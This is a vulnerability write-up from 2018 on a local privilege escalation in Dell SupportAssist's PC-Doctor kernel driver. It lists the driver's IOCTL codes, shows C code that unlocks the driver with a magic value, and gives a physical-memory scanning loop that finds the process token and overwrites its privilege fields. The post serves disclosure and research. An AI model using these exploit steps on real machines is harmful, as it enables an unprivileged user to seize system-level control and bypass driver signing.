			<h1>Dell SupportAssist Driver - Local Privilege Escalation</h1>
			<b><time>2018-05-01</time></b>
		       

			<div>
				<p>This post details a local privilege escalation (LPE) vulnerability I found
in Dell&rsquo;s SupportAssist[0] tool. The bug is in a kernel driver loaded by
the tool, and is pretty similar to bugs found by ReWolf in
ntiolib.sys/winio.sys[1], and those found by others in ASMMAP/ASMMAP64[2].
These bugs are pretty interesting because they can be used to bypass driver
signature enforcement (DSE) ad infinitum, or at least until they&rsquo;re no longer
compatible with newer operating systems.</p>
<p>Dell&rsquo;s SupportAssist is, according to the site, &ldquo;(..) now preinstalled on most
of all new Dell devices running Windows operating system (..)&rdquo;. It&rsquo;s primary
purpose is to troubleshoot issues and provide support capabilities both to the
user and to Dell. There&rsquo;s quite a lot of functionality in this software itself,
which I spent quite a bit of time reversing and may blog about at a later date.</p>
<h2 id="bug">Bug</h2>
<p>Calling this a &ldquo;bug&rdquo; is really a misnomer; the driver exposes this
functionality eagerly. It actually exposes a lot of functionality, much like
some of the previously mentioned drivers. It provides capabilities for reading
and writing the model-specific register (MSR), resetting the 1394 bus, and
reading/writing CMOS.</p>
<p>The driver is first loaded when the SupportAssist tool is launched, and the
filename is <code>pcdsrvc_x64.pkms</code> on x64 and <code>pcdsrvc.pkms</code> on x86. Incidentally,
this driver isn&rsquo;t actually even built by Dell, but rather another company,
PC-Doctor[3]. This company provides &ldquo;system health solutions&rdquo; to a variety of
companies, including Dell, Intel, Yokogawa, IBM, and others. Therefore, it&rsquo;s
highly likely that this driver can be found in a variety of other products&hellip;</p>
<p>Once the driver is loaded, it exposes a symlink to the device at
<code>PCDSRVC{3B54B31B-D06B6431-06020200}_0</code> which is writable by unprivileged users
on the system. This allows us to trigger one of the many IOCTLs exposed by the
driver; approximately 30. I found a DLL used by the userland agent that served
as an interface to the kernel driver and conveniently had symbol names
available, allowing me to extract the following:</p>
<pre tabindex="0"><code>// 0x222004 = driver activation ioctl
// 0x222314 = IoDriver::writePortData
// 0x22230c = IoDriver::writePortData
// 0x222304 = IoDriver::writePortData
// 0x222300 = IoDriver::readPortData
// 0x222308 = IoDriver::readPortData
// 0x222310 = IoDriver::readPortData
// 0x222700 = EcDriver::readData
// 0x222704 = EcDriver::writeData
// 0x222080 = MemDriver::getPhysicalAddress
// 0x222084 = MemDriver::readPhysicalMemory
// 0x222088 = MemDriver::writePhysicalMemory
// 0x222180 = Msr::readMsr
// 0x222184 = Msr::writeMsr
// 0x222104 = PciDriver::readConfigSpace
// 0x222108 = PciDriver::writeConfigSpace
// 0x222110 = PciDriver::?
// 0x22210c = PciDriver::?
// 0x222380 = Port1394::doesControllerExist
// 0x222384 = Port1394::getControllerConfigRom
// 0x22238c = Port1394::getGenerationCount
// 0x222388 = Port1394::forceBusReset
// 0x222680 = SmbusDriver::genericRead
// 0x222318 = SystemDriver::readCmos8
// 0x22231c = SystemDriver::writeCmos8
// 0x222600 = SystemDriver::getDevicePdo
// 0x222604 = SystemDriver::getIntelFreqClockCounts
// 0x222608 = SystemDriver::getAcpiThermalZoneInfo
</code></pre><p>Immediately the MemDriver class jumps out. After some reversing, it appeared
that these functions do exactly as expected: allow userland services to both
read and write arbitrary physical addresses. There are a few quirks, however.</p>
<p>To start, the driver must first be &ldquo;unlocked&rdquo; in order for it to begin
processing control codes. It&rsquo;s unclear to me if this is some sort of hacky
event trigger or whether the kernel developers truly believed this would
inhibit malicious access. Either way, it&rsquo;s goofy. To unlock the driver, a
simple ioctl with the proper code must be sent. Once received, the driver will
process control codes for the lifetime of the system.</p>
<p>To unlock the driver, we just execute the following:</p>
<pre tabindex="0"><code>BOOL bResult;
DWORD dwRet;
SIZE_T code = 0xA1B2C3D4, outBuf;

bResult = DeviceIoControl(hDriver, 0x222004, 
                          &amp;code, sizeof(SIZE_T), 
                          &amp;outBuf, sizeof(SIZE_T), 
                          &amp;dwRet, NULL);
</code></pre><p>Once the driver receives this control code and validates the received code
(0xA1B2C3D4), it sets a global flag and begins accepting all other control
codes.</p>
<h2 id="exploitation">Exploitation</h2>
<p>From here, we could exploit this the same way rewolf did [4]: read out physical
memory looking for process pool tags, then traverse these until we identify our
process as well as a SYSTEM process, then steal the token. However, PCD
appears to give us a shortcut via <code>getPhysicalAddress</code> ioctl. If this does
indeed return the physical address of a given virtual address (VA), we can simply
find the physical of our VA and enable a couple token privileges[5] using the
<code>writePhysicalMemory</code> ioctl.</p>
<p>Here&rsquo;s how the <code>getPhysicalAddress</code> function works:</p>
<pre tabindex="0"><code>v5 = IoAllocateMdl(**(PVOID **)(a1 + 0x18), 1u, 0, 0, 0i64);
v6 = v5;
if ( !v5 )
  return 0xC0000001i64;
MmProbeAndLockPages(v5, 1, 0);
**(_QWORD **)(v3 + 0x18) = v4 &amp; 0xFFF | ((_QWORD)v6[1].Next &lt;&lt; 0xC);
MmUnlockPages(v6);
IoFreeMdl(v6);
</code></pre><p>Keen observers will spot the problem here; the <code>MmProbeAndLockPages</code> call is
passing in UserMode for the KPROCESSOR_MODE, meaning we won&rsquo;t be able to
resolve any kernel mode VAs, only usermode addresses.</p>
<p>We can still read chunks of physical memory unabated, however, as the
<code>readPhysicalMemory</code> function is quite simple:</p>
<pre tabindex="0"><code>if ( !DoWrite )
{
  memmove(a1, a2, a3);
  return 1;
}
</code></pre><p>They reuse a single function for reading and writing physical memory; we&rsquo;ll
return to that. I decided to take a different approach than rewolf for a number
of reasons with great results.</p>
<p>Instead, I wanted to toggle on SeDebugPrivilege for my current process token.
This would require finding the token in memory and writing a few bytes at a
field offset. To do this, I used <code>readPhysicalMemory</code> to read chunks of memory
of size 0x10000000 and checked for the first field in a _TOKEN, TokenSource. In
a user token, this will be the string <code>User32</code>. Once we&rsquo;ve identified this,
we double check that we&rsquo;ve found a token by validating the TokenLuid, which we
can obtain from userland using the GetTokenInformation API.</p>
<p>In order to speed up the memory search, I only iterate over the addresses that
match the token&rsquo;s virtual address byte index. Essentially, when you convert a
virtual address to a physical address (PA) the byte index, or the lower 12 bits,
do not change. To demonstrate, assume we have a VA of 0xfffff8a001cc2060.
Translating this to a physical address then:</p>
<pre tabindex="0"><code>kd&gt; !pte  fffff8a001cc2060
                                           VA fffff8a001cc2060
PXE at FFFFF6FB7DBEDF88    PPE at FFFFF6FB7DBF1400    PDE at FFFFF6FB7E280070    PTE at FFFFF6FC5000E610
contains 000000007AC84863  contains 00000000030D4863  contains 0000000073147863  contains E6500000716FD963
pfn 7ac84     ---DA--KWEV  pfn 30d4      ---DA--KWEV  pfn 73147     ---DA--KWEV  pfn 716fd     -G-DA--KW-V

kd&gt; ? 716fd * 0x1000 + 060
Evaluate expression: 1903153248 = 00000000`716fd060
</code></pre><p>So our physical address is 0x716fd060 (if you&rsquo;d like to read more about
converting VA to PA, check out this great Microsoft article[6]). Notice the
lower 12 bits remain the same between VA/PA. The search loop then boiled down
to the following code:</p>
<pre tabindex="0"><code>uStartAddr = uStartAddr + (VirtualAddress &amp; 0xfff);
for (USHORT chunk = 0; chunk &lt; 0xb; ++chunk) {
    lpMemBuf = ReadBlockMem(hDriver, uStartAddr, 0x10000000);
    for(SIZE_T i = 0; i &lt; 0x10000000; i += 0x1000, uStartAddr += 0x1000){
        if (memcmp((DWORD)lpMemBuf + i, &#34;User32 &#34;, 8) == 0){
            
            if (TokenId &lt;= 0x0)
                FetchTokenId();

            if (*(DWORD*)((char*)lpMemBuf + i + 0x10) == TokenId) {
                hTokenAddr = uStartAddr;
                break;
            }
        }
    }

    HeapFree(GetProcessHeap(), 0, lpMemBuf);

    if (hTokenAddr &gt; 0x0)
        break;
}
</code></pre><p>Once we identify the PA of our token, we trigger two separate writes at offset
0x40 and offset 0x48, or the Enabled and Default fields of a _TOKEN. This
sometimes requires a few runs to get right (due to mapping, which I was too
lazy to work out), but is very stable.</p>
